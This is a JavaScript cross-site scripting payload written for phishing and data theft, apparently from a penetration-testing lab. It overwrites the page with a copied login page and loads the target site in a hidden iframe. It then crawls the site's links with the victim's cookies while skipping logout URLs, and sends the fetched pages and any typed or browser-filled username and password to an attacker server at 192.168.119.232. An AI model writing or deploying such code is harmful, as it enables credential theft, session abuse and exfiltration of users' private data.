// overwrite html innerHTML to alter web page looks
html = document.getElementsByTagName('html')[0];
html.innerHTML = `

XXX COPY&PASTE CONTENT OF HTML tag OF TARGET APPLICATION/PAGE (f.e. login page) TO USE AS BASE OF PHISHING XXX

`

// return all unique and valid hrefs
function getUniqueValidHrefs() {
    malframe = document.getElementById("malframe");
    allA = malframe.contentDocument.getElementsByTagName("a");
    allHrefs = [];
    for (var i=0; i<allA.length; i++){
        if (validURL(allA[i].href)) {
            allHrefs.push(allA[i].href);
        }
    }

    // usage example:
    var uniqueHrefs = allHrefs.filter(onlyUnique);
    return uniqueHrefs;
}

//https://stackoverflow.com/questions/1960473/get-all-unique-values-in-a-javascript-array-remove-duplicates
function onlyUnique(value, index, self) {
    return self.indexOf(value) === index;
}
  
//https://stackoverflow.com/questions/1303872/trying-to-validate-url-using-javascript
function validURL(url) {
    //filter out session related endpoints to not log-out the user
    if (url.includes("logout") || url.includes("log-out") || url.includes("signout") || url.includes("sign-out")) {
        return false;
    }
    return /^(?:(?:(?:https?|ftp):)?\/\/)(?:\S+(?::\S*)?@)?(?:(?!(?:10|127)(?:\.\d{1,3}){3})(?!(?:169\.254|192\.168)(?:\.\d{1,3}){2})(?!172\.(?:1[6-9]|2\d|3[0-1])(?:\.\d{1,3}){2})(?:[1-9]\d?|1\d\d|2[01]\d|22[0-3])(?:\.(?:1?\d{1,2}|2[0-4]\d|25[0-5])){2}(?:\.(?:[1-9]\d?|1\d\d|2[0-4]\d|25[0-4]))|(?:(?:[a-z\u00a1-\uffff0-9]-*)*[a-z\u00a1-\uffff0-9]+)(?:\.(?:[a-z\u00a1-\uffff0-9]-*)*[a-z\u00a1-\uffff0-9]+)*(?:\.(?:[a-z\u00a1-\uffff]{2,})).?)(?::\d{2,5})?(?:[/?#]\S*)?$/i.test( url );    
}

// Get all identified endpoints and eventually, within the final .then function, the text is sent to the API server along with the source URL
function getContent(validUniqueHrefs) {
    validUniqueHrefs.forEach(href =>{
        fetch(href, {
            "credentials": "include",
            "method": "GET",
        })
        .then((response) => {
          return response.text();
        })
        .then(function (text){
          fetch("https://192.168.119.232/storeContent", {
            body: "location=" + encodeURIComponent(href) + "&content=" + encodeURIComponent(text),
            headers: {
              "Content-Type": "application/x-www-form-urlencoded"
            },
            method: "POST"
          })
        });
    })
}

function extractCredentials() {
    password = document.getElementById('LoginUserPassword').value;
    username = document.getElementById('LoginUserUsername').value;

    fetch("https://192.168.119.232/storeCredentials", {
            body: "username=" + encodeURIComponent(username) + "&password=" + encodeURIComponent(password),
            headers: {
              "Content-Type": "application/x-www-form-urlencoded"
            },
            method: "POST"
          })
}

function actions() {
    setTimeout(
        function() { 
            extractCredentials(); // this will send out any pre-filled creds by the browser
            validUniqueHrefs = this.getUniqueValidHrefs(); 
            getContent(validUniqueHrefs);
        }, 3000); // wait X seconds so all the endpoints loaded by additional .js scripts are present in the DOM inside the iframe before enumeration
}

var iframe = document.createElement('iframe');
iframe.setAttribute("style","display:none"); // hide iframe
iframe.onload = actions;
iframe.width = "100%";
iframe.height = "100%";
iframe.src = "https://targetdomain"; //CHANGE THIS
iframe.id = "malframe";

body = document.getElementsByTagName('body')[0];
body.appendChild(iframe);
